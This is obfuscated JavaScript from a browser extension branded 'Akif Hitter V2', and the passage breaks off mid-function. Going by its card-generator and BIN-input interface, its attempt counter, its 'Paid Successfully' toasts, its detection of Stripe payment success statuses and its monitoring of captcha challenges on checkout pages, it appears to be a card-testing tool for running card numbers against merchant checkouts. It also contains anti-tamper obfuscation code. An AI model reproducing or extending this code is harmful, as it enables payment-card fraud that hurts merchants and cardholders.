(function () {
  const v_1 = function () {
      let v_1_1 = true;
      return function (p_1, p_2) {
        const v_1_2 = v_1_1 ? function () {
          if (p_2) {
            const v_1_3 = p_2.apply(p_1, arguments);
            return p_2 = null, v_1_3;
          }
        } : function () {};
        return v_1_1 = false, v_1_2;
      };
    }(),
    v_2 = function () {
      let v_1_1 = true;
      return function (p_1, p_2) {
        const v_1_2 = v_1_1 ? function () {
          if (p_2) {
            const v_1_3 = p_2.apply(p_1, arguments);
            return p_2 = null, v_1_3;
          }
        } : function () {};
        return v_1_1 = false, v_1_2;
      };
    }();
  'use strict';
  function fn_1_1(p_1) {
    const v_1_1 = {};
    v_1_1.jYFwq = "action";
    if (!p_1) return false;
    const v_3_1 = p_1.toLowerCase();
    if (v_3_1 === "succeeded") return true;
    if (v_3_1 === "authorized") return true;
    if (v_3_1 === "payment_intent.succeeded") return true;
    if (v_3_1 === "charge.succeeded") {
      return true;
    }
    if (v_3_1 === "approved") return true;
    if (v_3_1 === "paid") return true;
    if (v_3_1 === "confirmed") return true;
    if (v_3_1 === "captured") {
      return true;
    }
    return false;
  }
  function fn_2() {
    try {
      const v_1_1 = localStorage.getItem("akif_first_name"),
        v_2_1 = localStorage.getItem("akif_last_name");
      if (v_1_1 && v_1_1 !== '') {
        if (v_2_1 && v_2_1 !== '') return v_1_1 + '\x20' + v_2_1;
        return v_1_1;
      }
      const v_3_1 = localStorage.getItem("akif_username");
      if (v_3_1 && v_3_1 !== "User" && v_3_1 !== "AkifUser") return v_3_1;
      if (window.AkifLogin && window.AkifLogin.getUsername) {
        const v_1_2 = window.AkifLogin.getUsername();
        if (v_1_2 && v_1_2 !== "User" && v_1_2 !== "AkifUser") {
          return v_1_2;
        }
      }
      const v_4_1 = localStorage.getItem(v_7?.["CUSTOM_NAME"]);
      if (v_4_1 && v_4_1 !== '') return v_4_1;
    } catch (v_1_1) {}
    return "AkifUser";
  }
  function fn_3() {
    try {
      const v_1_1 = localStorage.getItem("akif_user_id");
      if (v_1_1 && v_1_1 !== '' && v_1_1 !== "undefined" && v_1_1 !== "null") return v_1_1;
      if (window.AkifLogin && window.AkifLogin.getUserId) {
        const v_1_2 = window.AkifLogin.getUserId();
        if (v_1_2 && v_1_2 !== '' && v_1_2 !== "undefined" && v_1_2 !== "null") {
          return v_1_2;
        }
      }
    } catch (v_1_1) {}
    return '';
  }
  async function fn_4(p_1) {
    return true;
  }
  window.sendAkifHitNotification = fn_4;
  const v_3 = ["@keyframes akifSlideInRight{from{opacity:0;transform:translateX(-20px)}to{opacity:1;transform:translateX(0)}}", "@keyframes akifProgressAnim{from{width:100%}to{width:0%}}", "@keyframes akifFadeOut{from{opacity:1;transform:translateX(0)}to{opacity:0;transform:translateX(-10px)}}", "@keyframes akifSlideInLeft{from{opacity:0;transform:translateX(-100%)}to{opacity:1;transform:translateX(0)}}", "@keyframes akifSlideOutLeft{from{opacity:1;transform:translateX(0)}to{opacity:0;transform:translateX(-100%)}}", "@keyframes cardToastSlideIn{0%{opacity:0;transform:translateX(-20px) scale(.95)}60%{opacity:1;transform:translateX(4px) scale(1.02)}100%{opacity:1;transform:translateX(0) scale(1)}}", "@keyframes cardToastSlideOut{0%{opacity:1;transform:translateX(0) scale(1)}100%{opacity:0;transform:translateX(-20px) scale(.95)}}", "@keyframes iconPulse{0%{transform:scale(.75);opacity:0}55%{transform:scale(1.1);opacity:1}100%{transform:scale(1);opacity:1}}", "@keyframes labelFadeIn{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:translateY(0)}}", "@keyframes valueFadeIn{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:translateY(0)}}", "@keyframes copyFadeIn{from{opacity:0;transform:scale(.85)}to{opacity:1;transform:scale(1)}}", ".akif-toast-v5{position:fixed!important;top:16px!important;right:16px!important;z-index:2147483647!important;", "background:linear-gradient(180deg,rgba(17,25,48,.78),rgba(11,18,32,.88))!important;", "border-radius:12px!important;padding:11px 13px!important;width:280px!important;max-width:calc(100vw - 32px)!important;", "box-shadow:0 12px 30px rgba(2,8,23,.6), 0 0 0 1px rgba(96,165,250,.08) inset!important;", "color:#E6EFFF!important;font-family:'Inter',-apple-system,'Segoe UI',Roboto,sans-serif!important;", "animation:akifSlideInRight .3s cubic-bezier(.2,.9,.4,1.1)!important;cursor:pointer!important;", "transition:transform .2s cubic-bezier(.2,.9,.4,1.1)!important;", "backdrop-filter:blur(18px) saturate(140%)!important;-webkit-backdrop-filter:blur(18px) saturate(140%)!important;", "border:1px solid rgba(96,165,250,.28)!important}", ".akif-toast-v5:hover{transform:translateX(2px)!important}", ".akif-toast-icon-v5{width:32px!important;height:32px!important;", "background:rgba(96,165,250,.14)!important;color:#60a5fa!important;", "display:inline-flex!important;align-items:center!important;justify-content:center!important;", "border-radius:9px!important;font-size:16px!important;font-weight:700!important;", "border:1px solid rgba(96,165,250,.3)!important;margin-right:8px!important;vertical-align:middle!important}", ".akif-badge-v5{display:inline-block!important;font-size:9px!important;font-weight:700!important;", "color:#60a5fa!important;background:rgba(96,165,250,.14)!important;", "padding:2px 7px!important;border-radius:999px!important;letter-spacing:.6px!important;", "margin-bottom:4px!important;text-transform:uppercase!important;", "border:1px solid rgba(96,165,250,.3)!important}", ".akif-toast-title-v5{font-size:12px!important;font-weight:700!important;color:#E6EFFF!important;", "margin-bottom:2px!important;text-transform:lowercase!important;", "font-family:'Space Mono','JetBrains Mono',monospace!important}", ".akif-toast-subtitle-v5{font-size:9px!important;color:#93a4c4!important;", "font-family:'Space Mono','JetBrains Mono',monospace!important;line-height:1.4!important}", ".akif-progress-v5{height:2px!important;background:rgba(255,255,255,.08)!important;", "border-radius:10px!important;margin-top:8px!important;overflow:hidden!important}", ".akif-progress-bar-v5{height:100%!important;", "background:linear-gradient(90deg,#60a5fa,#3b82f6)!important;", "border-radius:10px!important;box-shadow:0 0 8px rgba(96,165,250,.55)!important;", "animation:akifProgressAnim 3.5s linear forwards!important}", ".akif-toast-v5.error{border-color:rgba(239,68,68,.4)!important}", ".akif-toast-v5.error .akif-toast-icon-v5{background:rgba(239,68,68,.15)!important;color:#fca5a5!important;border-color:rgba(239,68,68,.4)!important}", ".akif-toast-v5.error .akif-progress-bar-v5{background:linear-gradient(90deg,#f87171,#ef4444)!important;box-shadow:0 0 8px rgba(239,68,68,.45)!important}", ".card-toast{position:fixed!important;top:95px!important;right:16px!important;", "background:linear-gradient(180deg,rgba(17,25,48,.78),rgba(11,18,32,.88))!important;", "backdrop-filter:blur(18px)!important;-webkit-backdrop-filter:blur(18px)!important;", "border-radius:12px!important;padding:9px 12px!important;z-index:2147483648!important;", "border:1px solid rgba(96,165,250,.28)!important;", "font-family:'Inter',-apple-system,'Segoe UI',Roboto,sans-serif!important;", "animation:cardToastSlideIn .35s cubic-bezier(.2,.9,.4,1.1) forwards!important;", "display:flex!important;align-items:center!important;gap:10px!important;", "min-width:220px!important;max-width:300px!important;", "box-shadow:0 10px 26px rgba(2,8,23,.55), 0 0 0 1px rgba(96,165,250,.08) inset!important;", "opacity:0!important;transform:translateX(-20px)!important}", ".card-toast.hide{animation:cardToastSlideOut .25s ease forwards!important}", ".card-toast:hover{transform:translateX(3px)!important;border-color:rgba(96,165,250,.45)!important;transition:transform .2s ease!important}", ".card-toast-icon{width:32px!important;height:32px!important;", "background:rgba(96,165,250,.15)!important;", "border:1px solid rgba(96,165,250,.3)!important;border-radius:9px!important;", "display:flex!important;align-items:center!important;justify-content:center!important;", "flex-shrink:0!important;animation:iconPulse .45s cubic-bezier(.2,.9,.4,1.1)!important}", ".card-toast-icon svg{width:18px!important;height:18px!important;color:#60a5fa!important}", ".card-toast-content{flex:1!important;min-width:0!important}", ".card-toast-label{font-size:8px!important;font-weight:800!important;color:#60a5fa!important;", "text-transform:uppercase!important;letter-spacing:.8px!important;margin-bottom:3px!important;", "animation:labelFadeIn .3s ease .1s both!important}", ".card-toast-value{font-size:10px!important;", "font-family:'Space Mono','JetBrains Mono',monospace!important;color:#E6EFFF!important;", "letter-spacing:.3px!important;word-break:break-all!important;font-weight:500!important;", "animation:valueFadeIn .3s ease .2s both!important}", ".card-toast-copy{background:rgba(255,255,255,.06)!important;", "border:1px solid rgba(255,255,255,.08)!important;color:#93a4c4!important;", "width:26px!important;height:26px!important;border-radius:7px!important;", "cursor:pointer!important;font-size:11px!important;", "display:flex!important;align-items:center!important;justify-content:center!important;", "transition:background .2s ease,color .2s ease,transform .2s cubic-bezier(.2,.9,.4,1.1)!important;", "flex-shrink:0!important;animation:copyFadeIn .3s ease .3s both!important}", ".card-toast-copy:hover{background:rgba(96,165,250,.18)!important;color:#60a5fa!important;transform:scale(1.08)!important}", ".logout-square-btn{background:rgba(239,68,68,.14)!important;", "border:1px solid rgba(239,68,68,.35)!important;color:#ef4444!important;", "width:28px!important;height:28px!important;border-radius:8px!important;", "display:flex!important;align-items:center!important;justify-content:center!important;", "cursor:pointer!important;font-size:14px!important;", "transition:all .25s ease!important;margin-right:4px!important}", ".logout-square-btn:hover{background:rgba(239,68,68,.22)!important;border-color:rgba(239,68,68,.55)!important;transform:scale(1.07)!important}", ".logout-square-btn:active{transform:scale(.95)!important}", ".header-controls{display:flex!important;align-items:center!important;gap:6px!important}"].join('');
  let v_4 = false,
    v_5 = null;
  function fn_5() {
    if (window.AkifLogin && window.AkifLogin.isLoggedIn()) return v_4 = true, v_5 = window.AkifLogin.getUserId(), true;
    return false;
  }
  function fn_6(p_1) {
    if (window.AkifLogin) window.AkifLogin.showLogin(p_1);else {
      const v_1_1 = setInterval(() => {
        window.AkifLogin && (clearInterval(v_1_1), window.AkifLogin.showLogin(p_1));
      }, 500);
      setTimeout(() => clearInterval(v_1_1), 10000);
    }
  }
  let v_6 = null;
  function fn_7(p_1, p_2, p_3, p_4, p_5, p_6, p_7) {
    const v_1_1 = p_3 ? (p_3 / 1000).toFixed(2) + 's' : '?s',
      v_2_1 = String(p_2 || p_1 || '').toLowerCase(),
      v_3_1 = p_6 ? p_6 + '/' + (p_7 || '?') : '';
    let v_4_1 = '';
    if (p_4 && p_4.amount) v_4_1 = p_4.amount + '\x20' + (p_4.currency || "USD");else typeof extractedPaymentData !== "undefined" && extractedPaymentData && extractedPaymentData.amount && (v_4_1 = extractedPaymentData.amount + '\x20' + (extractedPaymentData.currency || "USD"));
    v_6 && v_6.parentNode && v_6.remove();
    const v_5_1 = document.createElement("div");
    if (p_5) {
      v_5_1.className = "akif-cyber-toast", v_5_1.innerHTML = "\n      <div class=\"success-card\">\n        <div class=\"success-left\">\n          <div class=\"icon-wrap\">\n            <svg viewBox=\"0 0 24 24\" fill=\"none\" xmlns=\"http://www.w3.org/2000/svg\">\n              <path d=\"M5 13l4 4L19 7\" stroke=\"currentColor\" stroke-width=\"2.5\" stroke-linecap=\"round\" stroke-linejoin=\"round\"/>\n            </svg>\n          </div>\n        </div>\n        <div class=\"success-content\">\n          <div class=\"badge\">AKIF HITTER V2</div>\n          <div class=\"title\">Paid Successfully \u2713</div>\n          <div class=\"subtitle\">\n            " + v_2_1 + " \u2022 " + v_1_1 + '\x20' + (v_3_1 ? "\u2022 Attempt " + v_3_1 : '') + '\x20' + (v_4_1 ? '•\x20' + v_4_1 : '') + "\n          </div>\n          <div class=\"progress\">\n            <div class=\"bar\"></div>\n          </div>\n        </div>\n      </div>\n    ";
    } else v_5_1.className = "akif-toast-v5 error", v_5_1.innerHTML = "\n      <div class=\"akif-toast-row\">\n        <div class=\"akif-toast-icon-v5\">\u2717</div>\n        <div class=\"akif-toast-title-v5\">" + v_2_1 + "</div>\n      </div>\n      <div class=\"akif-toast-subtitle-v5\">\n        \u23F1 " + v_1_1 + '\x20' + (v_3_1 ? "\u2022 Attempt " + v_3_1 : '') + '\x20' + (v_4_1 ? '•\x20' + v_4_1 : '') + "\n      </div>\n      <div class=\"akif-progress-v5\">\n        <div class=\"akif-progress-bar-v5\"></div>\n      </div>\n    ";
    if (!document.querySelector("#akif-toast-style")) {
      const v_1_2 = document.createElement("style");
      v_1_2.id = "akif-toast-style", v_1_2.textContent = v_3, document.head.appendChild(v_1_2);
    }
    if (!document.querySelector("#akif-fa-cdn")) {
      const v_1_2 = document.createElement("link");
      v_1_2.id = "akif-fa-cdn", v_1_2.rel = "stylesheet", v_1_2.href = "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css", v_1_2.crossOrigin = "anonymous", v_1_2.referrerPolicy = "no-referrer", document.head.appendChild(v_1_2);
    }
    document.body.appendChild(v_5_1), v_6 = v_5_1, v_5_1.onclick = () => {
      if (v_5_1 && v_5_1.parentNode) {
        v_5_1.classList.add("hide"), setTimeout(() => {
          v_5_1.parentNode && v_5_1.remove(), v_6 === v_5_1 && (v_6 = null);
        }, 300);
      }
    }, setTimeout(() => {
      v_5_1 && v_5_1.parentNode && (v_5_1.classList.add("hide"), setTimeout(() => {
        v_5_1.parentNode && v_5_1.remove(), v_6 === v_5_1 && (v_6 = null);
      }, 300));
    }, 4000);
  }
  var v_7 = window.AkifKeys || {};
  const v_8 = {
      'storage.js': () => window.__AKIF_STORAGE_LOADED === true && typeof window.AkifStorage !== "undefined",
      'autofill.js': () => window.__AKIF_AUTOFILL_LOADED === true && typeof window.AkifAutofill !== "undefined"
    },
    v_9 = v_8;
  function fn_8() {
    const v_1_1 = {};
    v_1_1.lpbXP = "(((.+)+)+)+$";
    const v_2_1 = v_1_1;
    const v_3_1 = v_1(this, function () {
      return v_3_1.toString().search("(((.+)+)+)+$").toString().constructor(v_3_1).search(v_2_1.lpbXP);
    });
    v_3_1(), function () {
      v_2(this, function () {
        const v_1_2 = new RegExp("function *\\( *\\)"),
          v_2_2 = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", 'i'),
          v_3_2 = fn_1("init");
        if (!v_1_2.test(v_3_2 + "chain") || !v_2_2.test(v_3_2 + "input")) v_3_2('0');else {
          fn_1();
        }
      })();
    }();
    const v_4_1 = [],
      v_5_1 = [];
    for (const [v_1_2, v_2_2] of Object.entries(v_9)) {
      try {
        v_2_2() ? v_5_1.push(v_1_2) : v_4_1.push(v_1_2);
      } catch (v_1_3) {
        v_4_1.push(v_1_2);
      }
    }
    const v_6_1 = {};
    v_6_1.missingModules = v_4_1, v_6_1.loadedModules = v_5_1;
    const v_7_1 = v_6_1;
    return v_7_1;
  }
  function fn_9(p_1) {
    const v_1_1 = document.getElementById("akif-file-error-overlay");
    v_1_1 && v_1_1.remove();
    const v_2_1 = document.createElement("div");
    v_2_1.id = "akif-file-error-overlay";
    v_2_1.className = "akif-error-overlay";
    const v_3_1 = document.createElement("div");
    v_3_1.className = "akif-error-content";
    const v_4_1 = document.createElement("div");
    v_4_1.className = "akif-error-header", v_4_1.textContent = "\u26A0\uFE0F AkifX - File Error";
    const v_5_1 = document.createElement("div");
    v_5_1.className = "akif-error-body";
    const v_6_1 = document.createElement('p');
    v_6_1.className = "usagi-error-msg", v_6_1.textContent = "Extension files are missing or corrupted. Please reinstall the extension.";
    const v_7_1 = document.createElement("div");
    v_7_1.className = "usagi-error-missing";
    const v_8_1 = document.createElement("div");
    v_8_1.className = "akif-error-title", v_8_1.textContent = "Missing Files:", v_7_1.appendChild(v_8_1), p_1.forEach(p_1_1 => {
      const v_1_2 = document.createElement("div");
      v_1_2.className = "akif-error-item", v_1_2.innerHTML = "<span class=\"usagi-error-x\">\u2717</span> " + p_1_1, v_7_1.appendChild(v_1_2);
    });
    const v_9_1 = document.createElement("div");
    v_9_1.className = "akif-error-fix";
    const v_10_1 = document.createElement("div");
    v_10_1.className = "usagi-error-title usagi-error-title-green", v_10_1.textContent = "How to fix:", v_9_1.appendChild(v_10_1);
    const v_11_1 = document.createElement('ol');
    v_11_1.className = '', ["Remove the current extension", "Download the latest Akif H1tter package", "Load the extension again in Chrome"].forEach(p_1_1 => {
      const v_1_2 = document.createElement('li');
      v_1_2.textContent = p_1_1;
      v_11_1.appendChild(v_1_2);
    }), v_9_1.appendChild(v_11_1), v_5_1.appendChild(v_6_1), v_5_1.appendChild(v_7_1), v_5_1.appendChild(v_9_1), v_3_1.appendChild(v_4_1), v_3_1.appendChild(v_5_1), v_2_1.appendChild(v_3_1), document.body.appendChild(v_2_1);
  }
  const {
    missingModules: v_10,
    loadedModules: v_11
  } = fn_8();
  if (v_10.length > 0) {
    document.body ? fn_9(v_10) : document.addEventListener("DOMContentLoaded", () => fn_9(v_10));
    window.__akifAutoXBlocked = true;
    return;
  }
  window.__akifAutoXVerified = true;
  if (window.__akifAutoXBlocked) {} else {
    if (window.__akifAutoXLoaded) {} else {
      window.__akifAutoXLoaded = true;
      var v_7 = window.AkifKeys || {};
      let v_1_1 = false,
        v_2_1 = false,
        v_3_1 = false,
        v_4_1 = false,
        v_5_1 = null;
      const v_6_1 = ["card-generator-overlay", "akif-page-watermark", "success-toast", "success-toast-content", "success-toast-text", "success-toast-title", "success-toast-details", "success-ripple-container", "success-ripple-ring", "success-check", "warning-toast", "card-toast", "cc-modal", "bin-input-row", "panel-header", "panel-body", "panel-title", "update-screen", "color-ball", "section", "section-divider", "action-btn", "primary-btn", "collapsible-section", "collapsible-header", "collapsible-content", "mode-toggle", "mode-option", "header-controls", "panel-header-content", "minimize-btn", "music-toggle", "akif-toast-v5"],
        v_7_1 = [".card-generator-overlay", ".usagi-page-watermark", ".success-toast", ".success-toast-content", ".success-toast-text", ".warning-toast", ".card-toast", ".cc-modal", ".color-ball-container", ".section", ".section-divider", ".collapsible-section", "[class*=\"hcaptcha\"]", "[class*=\"h-captcha\"]", "[class*=\"captcha\"]", "[class*=\"Captcha\"]", "[class*=\"challenge\"]", "[class*=\"Challenge\"]", "[class*=\"modal\"]", "[class*=\"Modal\"]", "[class*=\"overlay\"]", "[class*=\"Overlay\"]", "[role=\"dialog\"]", "[role=\"alertdialog\"]", "[class*=\"PaymentMethod\"]", "[class*=\"payment-method\"]", "[class*=\"paymentMethod\"]", "[class*=\"PaymentOptions\"]", "[class*=\"payment-options\"]", "[class*=\"WalletOptions\"]", "[class*=\"wallet-options\"]", "[role=\"radiogroup\"]", "[role=\"tablist\"]", ".akif-toast-v5"];
      function fn_1_2(p_1) {
        if (!p_1 || !p_1.classList) return false;
        if (p_1.closest && p_1.closest(".card-generator-overlay")) return true;
        if (p_1.closest && p_1.closest(".success-toast")) {
          return true;
        }
        if (p_1.closest && p_1.closest(".warning-toast")) return true;
        if (p_1.closest && p_1.closest(".card-toast")) return true;
        if (p_1.closest && p_1.closest(".cc-modal")) return true;
        if (p_1.closest && p_1.closest(".akif-toast-v5")) return true;
        if (p_1.closest && (p_1.closest("[data-hcaptcha]") || p_1.closest("[class*=\"hcaptcha\"]") || p_1.closest("[class*=\"h-captcha\"]") || p_1.closest("[id*=\"hcaptcha\"]") || p_1.closest("[id*=\"h-captcha\"]") || p_1.closest("iframe[src*=\"hcaptcha\"]") || p_1.closest("[class*=\"captcha\"]") || p_1.closest("[class*=\"Captcha\"]") || p_1.closest("[class*=\"challenge\"]") || p_1.closest("[class*=\"Challenge\"]"))) return true;
        for (const v_1_2 of v_6_1) {
          if (p_1.classList.contains(v_1_2)) return true;
        }
        if (p_1.id && p_1.id.includes("usagi")) {
          return true;
        }
        if (p_1.id && (p_1.id.includes("hcaptcha") || p_1.id.includes("captcha"))) {
          return true;
        }
        if (p_1.closest) for (const v_1_2 of v_7_1) {
          if (p_1.closest(v_1_2)) return true;
        }
        return false;
      }
      function fn_2_1() {
        try {
          const v_1_2 = document.querySelectorAll("iframe[src*=\"hcaptcha\"], iframe[src*=\"captcha\"], iframe[src*=\"challenge\"], iframe[data-hcaptcha], iframe[title*=\"hCaptcha\"], iframe[title*=\"captcha\"], iframe[title*=\"challenge\"], iframe[title*=\"verification\"], iframe[src*=\"recaptcha\"], iframe[src*=\"turnstile\"], iframe[src*=\"arkoselabs\"]");
          for (const v_1_3 of v_1_2) {
            try {
              const v_1_4 = v_1_3.getBoundingClientRect(),
                v_2_3 = window.getComputedStyle(v_1_3);
              if (v_1_4.width > 0 && v_1_4.height > 0 && v_2_3.display !== "none" && v_2_3.visibility !== "hidden" && v_2_3.opacity !== '0') return true;
            } catch (v_1_4) {
              continue;
            }
          }
          const v_2_2 = document.querySelectorAll("[class*=\"hcaptcha\"], [class*=\"h-captcha\"], [id*=\"hcaptcha\"], [id*=\"h-captcha\"], [data-hcaptcha], [class*=\"captcha-container\"], [class*=\"captcha-overlay\"], [class*=\"challenge-container\"], [class*=\"ChallengeContainer\"], [class*=\"recaptcha\"], [class*=\"turnstile\"], [class*=\"cf-turnstile\"], [class*=\"captcha-modal\"], [class*=\"CaptchaModal\"], [class*=\"captcha_modal\"], [class*=\"verification-modal\"], [class*=\"VerificationModal\"]");
          for (const v_1_3 of v_2_2) {
            try {
              const v_1_4 = v_1_3.getBoundingClientRect(),
                v_2_3 = window.getComputedStyle(v_1_3);
              if (v_1_4.width > 50 && v_1_4.height > 50 && v_2_3.display !== "none" && v_2_3.visibility !== "hidden" && v_2_3.opacity !== '0') return true;
            } catch (v_1_4) {
              continue;
            }
          }
          const v_3_2 = document.querySelectorAll("[class*=\"challenge-overlay\"], [class*=\"Challenge-overlay\"], [class*=\"security-challenge\"], [class*=\"SecurityChallenge\"]");
          for (const v_1_3 of v_3_2) {
            try {
              const v_1_4 = v_1_3.getBoundingClientRect(),
                v_2_3 = window.getComputedStyle(v_1_3);
              if (v_1_4.width > window.innerWidth * 0.5 && v_1_4.height > window.innerHeight * 0.3 && v_2_3.display !== "none" && v_2_3.visibility !== "hidden" && v_2_3.opacity !== '0') return true;
            } catch (v_1_4) {
              continue;
            }
          }
          return false;
        } catch (v_1_2) {
          return false;
        }
      }
      const v_8_1 = ["[class*=\"BrandIcon\"]", "[class*=\"CardBrand\"]", "[class*=\"brand-icon\"]", ".SubmitButton", "[class*=\"SubmitButton\"]", "button[type=\"submit\"]", ".Button--primary", "[data-testid=\"hosted-payment-submit-button\"]", "[class*=\"cvc\"]", "[class*=\"Cvc\"]", "[class*=\"cvv\"]", "[class*=\"SecurityCode\"]", "[class*=\"Link\"]", "[class*=\"link-button\"]", "[class*=\"LinkButton\"]", "[class*=\"PaymentMethod\"]", "[class*=\"payment-method\"]", "[class*=\"paymentMethod\"]", "[class*=\"Tab\"]", "[class*=\"tab\"]", "button[role=\"tab\"]", "[class*=\"Radio\"]", "[class*=\"radio\"]", "input[type=\"radio\"]", "[class*=\"Wallet\"]", "[class*=\"wallet\"]", "[class*=\"Icon\"]", "[class*=\"icon\"]", "[class*=\"Logo\"]", "[class*=\"logo\"]", "svg", "[role=\"img\"]", "input", "select", ".Input", "[class*=\"Input\"]", "footer", ".Footer", "[class*=\"Footer\"]", "[class*=\"footer\"]", "iframe", "[class*=\"FormFieldGroup\"]", "[class*=\"form-field\"]", "[class*=\"FormField\"]", "[class*=\"CheckoutForm\"]", "[class*=\"checkout-form\"]", "[class*=\"PaymentForm\"]", "[class*=\"ContactInformation\"]", "[class*=\"contact-information\"]", "[class*=\"BillingAddress\"]", "[class*=\"billing-address\"]", "[class*=\"ShippingAddress\"]", "[class*=\"shipping-address\"]", "[class*=\"CardElement\"]", "[class*=\"card-element\"]", "[class*=\"ElementsApp\"]", "[class*=\"elements-app\"]", "[class*=\"CheckoutPaymentForm\"]", "[class*=\"PaymentMethodSelector\"]", "[class*=\"AccordionItem\"]", "[class*=\"accordion\"]", "[class*=\"Fieldset\"]", "[class*=\"fieldset\"]", "[class*=\"FormRow\"]", "[class*=\"form-row\"]", "[class*=\"TextField\"]", "[class*=\"text-field\"]", "[class*=\"SelectField\"]", "[class*=\"select-field\"]", "[class*=\"Checkbox\"]", "[class*=\"checkbox\"]", "label", "[class*=\"Label\"]", "[class*=\"TermsText\"]", "[class*=\"terms\"]", "[class*=\"ReadOnlyFormField\"]", "[class*=\"read-only\"]", "[class*=\"SavedPaymentMethod\"]", "[class*=\"saved-payment\"]"];
      function fn_3_1() {
        return window.innerWidth > 768;
      }
      function fn_4_1() {
        const v_1_2 = navigator.userAgent || navigator.vendor || window.opera,
          v_2_2 = "ontouchstart" in window || navigator.maxTouchPoints > 0 || navigator.msMaxTouchPoints > 0,
          v_3_2 = window.matchMedia && window.matchMedia("(pointer: coarse)").matches,
          v_4_2 = window.matchMedia && window.matchMedia("(hover: hover)").matches,
          v_5_2 = /iPad|iPhone|iPod/.test(v_1_2) && !window.MSStream,
          v_6_2 = /android/i.test(v_1_2),
          v_7_2 = /Mobi|Mobile|webOS|BlackBerry|Opera Mini|IEMobile/i.test(v_1_2),
          v_8_2 = window.screen.width,
          v_9_2 = window.screen.height,
          v_10_2 = window.devicePixelRatio || 1,
          v_11_2 = Math.min(v_8_2, v_9_2) <= 768;
        if (v_5_2) return "ios";
        if (v_2_2 && v_3_2 && !v_4_2) {
          if (v_6_2) {
            if (/mobile/i.test(v_1_2)) {
              return "android_phone";
            } else return "android_tablet";
          }
          return "mobile";
        }
        if (v_2_2 && v_11_2 && v_10_2 >= 2) {
          if (v_6_2) return "android_phone";
          return "mobile";
        }
        if (v_2_2 && v_3_2) return "mobile";
        if (v_6_2) {
          if (/mobile/i.test(v_1_2)) {
            return "android_phone";
          } else return "android_tablet";
        }
        if (v_7_2) return "mobile";
        if (v_2_2 && v_11_2) {
          return "mobile";
        }
        return "desktop";
      }
      function fn_5_1() {
        const v_1_2 = fn_4_1();
        return ["ios", "android_phone", "android_tablet", "mobile"].includes(v_1_2);
      }
      function fn_6_1() {
        return "ontouchstart" in window || navigator.maxTouchPoints > 0 || navigator.msMaxTouchPoints > 0;
      }
      function fn_7_1() {
        return fn_5_1() || fn_6_1() && window.matchMedia("(pointer: coarse)").matches;
      }
      const v_9_1 = ["[class*=\"RightPanel\"]", "[class*=\"right-panel\"]", "[class*=\"rightPanel\"]", "[class*=\"FormContainer\"]", "[class*=\"form-container\"]", "[class*=\"PaymentElement\"]", "[class*=\"payment-element\"]", "[class*=\"CheckoutRightColumn\"]", "[class*=\"checkout-right\"]", "[class*=\"OrderForm\"]", "[class*=\"order-form\"]", "[class*=\"CheckoutContent\"]", "[class*=\"checkout-content\"]", "[class*=\"MainContent\"]", "[class*=\"main-content\"]", "[class*=\"FormSection\"]", "[class*=\"form-section\"]", "[class*=\"CheckoutMain\"]", "[class*=\"checkout-main\"]", "[class*=\"PaymentSection\"]", "[class*=\"payment-section\"]", "[class*=\"ContactSection\"]", "[class*=\"contact-section\"]", "[class*=\"App-Payment\"]", "[class*=\"app-payment\"]", "[class*=\"StripeElement\"]", "[class*=\"stripe-element\"]"];
      function fn_8_1(p_1) {
        if (!p_1) return false;
        for (const v_1_2 of v_8_1) {
          try {
            if (p_1.matches && p_1.matches(v_1_2)) return true;
            if (p_1.closest && p_1.closest(v_1_2)) return true;
          } catch (v_1_3) {}
        }
        if (fn_3_1()) for (const v_1_2 of v_9_1) {
          try {
            if (p_1.matches && p_1.matches(v_1_2)) return true;
            if (p_1.closest && p_1.closest(v_1_2)) return true;
          } catch (v_1_3) {}
        }
        return false;
      }
      const v_10_1 = ["#1e3a8a", "#1e40af", "#1d4ed8", "#2563eb", "#3b82f6", "#172554", "#1e293b", "#0b1220", "#082f49", "#0c4a6e"],
        v_11_1 = "#1e3a8a";
      let v_12 = v_11_1,
        v_13 = false,
        v_14 = false,
        v_15 = null;
      function fn_9_1() {
        return v_10_1[Math.floor(Math.random() * v_10_1.length)];
      }
      function fn_10() {
        return new Promise(p_1 => {
          const v_1_2 = localStorage.getItem(v_7.BG_ENABLED),
            v_2_2 = localStorage.getItem(v_7.PAGE_BG_COLOR),
            v_3_2 = localStorage.getItem(v_7.PAGE_HAS_CUSTOM);
          v_13 = v_1_2 === "true", v_14 = v_3_2 === "true";
          if (v_14 && v_2_2) v_12 = v_2_2;else {
            if (v_13) {
              v_15 = fn_9_1(), v_12 = v_15;
            }
          }
          p_1();
        });
      }
      fn_10().then(() => {
        v_13 && typeof fn_14 === "function" && fn_14();
      });
      function fn_11(p_1) {
        if (!p_1) return false;
        const v_3_2 = ["[class*=\"RightPanelContent\"]", "[class*=\"rightPanelContent\"]", "[class*=\"App-Payment\"]", "[class*=\"PaymentFormContainer\"]", "[class*=\"CheckoutPaymentForm\"]", "[class*=\"PaymentMethodForm\"]", "[class*=\"FormFieldGroup\"]", "[class*=\"ContactInformation\"]", "[class*=\"BillingAddressForm\"]", "[class*=\"PaymentElement\"]", "[class*=\"ElementsApp\"]", "[class*=\"StripeElement\"]", "[class*=\"CheckoutForm\"]", "[class*=\"PaymentRequestButton\"]", "[class*=\"AccordionItemContent\"]", "[class*=\"FormRow\"]", "[data-testid*=\"payment\"]", "[data-testid*=\"checkout\"]", "[class*=\"Column--right\"]", "[class*=\"column-right\"]", "[class*=\"RightColumn\"]", "[class*=\"right-column\"]"];
        for (const v_1_3 of v_3_2) {
          try {
            if (p_1.closest && p_1.closest(v_1_3)) return true;
          } catch (v_1_4) {}
        }
        if (fn_3_1()) try {
          const v_1_3 = p_1.getBoundingClientRect(),
            v_2_3 = window.innerWidth / 2;
          if (v_1_3.left > v_2_3 - 100) {
            const v_1_4 = window.getComputedStyle(p_1),
              v_2_4 = v_1_4.backgroundColor;
            if (v_2_4 && (v_2_4.includes("255, 255, 255") || v_2_4.includes("250, 250, 250") || v_2_4.includes("248, 248, 248") || v_2_4.includes("245, 245, 245"))) return true;
          }
        } catch (v_1_3) {}
        return false;
      }
      let v_16 = null,
        v_17 = new WeakSet(),
        v_18 = null;
      function fn_12(p_1) {
        if (v_16 !== p_1) {
          const v_1_2 = "2|1|0|4|3".split('|');
          let v_2_2 = 0;
          while (true) {
            switch (v_1_2[v_2_2++]) {
              case '0':
                document.documentElement.style.setProperty("background-color", p_1, "important");
